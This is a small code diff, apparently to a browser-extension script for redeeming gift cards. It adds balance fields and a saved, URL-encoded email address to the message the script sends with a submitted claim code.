@@ -25,6 +25,7 @@ try {
 
         var giftCardData = request.gift_card_data;
         giftCardData.gift_card_claim_message = getClaimCodeMessage();
+        giftCardData.current_balance = getCurrentBalance();
 
         //console.log("giftCardData",giftCardData);
 
@@ -40,6 +41,8 @@ try {
      console.log("redeemInputLine", redeemInputLine.value);
 
     var time_stamp = getDate();
+    var savedEmail = localStorage.getItem("email");
+    var encSavedEmail = encodeURIComponent(savedEmail).replace(/\./g, '%2E');
 
      chrome.runtime.sendMessage({
           type: 'gift_card_submitted',
@@ -48,7 +51,9 @@ try {
             gift_card_claim_code: redeemInputLine.value,
             time_stamp: time_stamp,
             gift_card_claim_message: "",
-            current_balance: getCurrentBalance()
+            prevous_balance: getCurrentBalance(),
+            current_balance: '',
+            email: encSavedEmail,
           } 
 
         });
